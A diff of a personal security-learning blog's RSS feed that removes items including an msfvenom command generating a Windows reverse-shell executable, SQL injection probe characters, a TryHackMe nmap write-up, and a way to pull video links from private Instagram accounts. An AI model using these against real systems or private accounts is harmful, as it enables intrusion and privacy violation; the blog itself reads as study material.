@@ -7,44 +7,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-    <lastBuildDate>Tue, 30 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kafkaesc.com/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>msfvenom Cheatsheet</title>
-      <link>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</link>
-      <pubDate>Tue, 30 Aug 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</guid>
-      <description>The standard syntax for msfvenom is as follows:
-msfvenom -p &amp;lt;PAYLOAD&amp;gt; &amp;lt;OPTIONS&amp;gt;
-For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
-msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&amp;lt;listen-IP&amp;gt; LPORT=&amp;lt;listen-port&amp;gt;
-Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
-  Staged payloads are sent in two parts. The first part is called the stager.</description>
-    </item>
-    
-    <item>
-      <title>Decteting and Enumerating SQLi</title>
-      <link>https://kafkaesc.com/posts/2022/08/decteting-and-enumerating-sqli/</link>
-      <pubDate>Sat, 27 Aug 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://kafkaesc.com/posts/2022/08/decteting-and-enumerating-sqli/</guid>
-      <description>Entry point &#39; &amp;quot; ` &#39;) &amp;quot;) `) &#39;)) &amp;quot;)) `)) This should break the query. By adding a comment symbol after, it should be accepted if an injection is present.
-Some sanitization of characters might be in place to prevent injections. Try encoding the payload to bypass it. See more useful payloads examples here.
-Comments MySQL
-#comment -- comment [Note the space after the double dash] /*comment*/ /*! MYSQL Special SQL */ PostgreSQL</description>
-    </item>
-    
-    <item>
-      <title>Get sharable link of an instagram video posts from private accounts</title>
-      <link>https://kafkaesc.com/posts/2022/08/get-sharable-link-of-an-instagram-video-posts-from-private-accounts/</link>
-      <pubDate>Mon, 15 Aug 2022 19:32:59 +0100</pubDate>
-      
-      <guid>https://kafkaesc.com/posts/2022/08/get-sharable-link-of-an-instagram-video-posts-from-private-accounts/</guid>
-      <description>The source of the video it&amp;rsquo;s on the page. The path of the link points exactly to the source of the file, but the domain is incorrect.
-To get the video in a shareable link, you just need to:
- Open the browser console (F12) Go to Network Filter by Media Click on the package that contains the content that you want Copy the path that&amp;rsquo;s in the link Concatenate it with https://scontent.</description>
-    </item>
-    
+    <lastBuildDate>Mon, 15 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kafkaesc.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Add shortcuts to Windows explorer right click menu</title>
       <link>https://kafkaesc.com/posts/2022/08/add-shortcuts-to-windows-explorer-right-click-menu/</link>
@@ -58,11 +21,11 @@ Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\Directory\background\she
     </item>
     
     <item>
-      <title>Google Dorking Cheatsheet</title>
-      <link>https://kafkaesc.com/posts/2022/08/google-dorking-cheatsheet/</link>
+      <title>Google Dorking Cheat Sheet</title>
+      <link>https://kafkaesc.com/posts/2022/08/google-dorking-cheat-sheet/</link>
       <pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate>
       
-      <guid>https://kafkaesc.com/posts/2022/08/google-dorking-cheatsheet/</guid>
+      <guid>https://kafkaesc.com/posts/2022/08/google-dorking-cheat-sheet/</guid>
       <description>Search filters    Filter Description Example     allintext Searches for occurrences of all the keywords given. allintext:&amp;quot;keyword&amp;quot;   intext Searches for the occurrences of keywords all at once or one at a time. intext:&amp;quot;keyword&amp;quot;   inurl Searches for a URL matching one of the keywords. inurl:&amp;quot;keyword&amp;quot;   allinurl Searches for a URL matching all the keywords in the query. allinurl:&amp;quot;keyword&amp;quot;   intitle Searches for occurrences of keywords in title all or one.</description>
     </item>
     
@@ -87,15 +50,6 @@ setxkbmap -option caps:swapescape  Note: To run it automatically at start, add t
       <guid>https://kafkaesc.com/about/</guid>
       <description>Currently working as a freelance videographer. Stories are how we learn, communicate and remember. I have always been fascinated by the power of moving pictures, and I&amp;rsquo;m grateful for being able to make a living by sharing my creations. Although making films is one of my biggest passions, I think it would suit better as a hobby. At the moment, I&amp;rsquo;m seeking to transition to the InfoSec field.
 I&amp;rsquo;m looking for a Penetration Testing position.</description>
-    </item>
-    
-    <item>
-      <title>THM - Retro</title>
-      <link>https://kafkaesc.com/posts/2022/06/thm-retro/</link>
-      <pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://kafkaesc.com/posts/2022/06/thm-retro/</guid>
-      <description>Enum nmap Nmap scan report for 10.10.34.228 Host is up (0.20s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: RETROWEB | NetBIOS_Domain_Name: RETROWEB | NetBIOS_Computer_Name: RETROWEB | DNS_Domain_Name: RetroWeb | DNS_Computer_Name: RetroWeb | Product_Version: 10.</description>
     </item>
     
     <item>
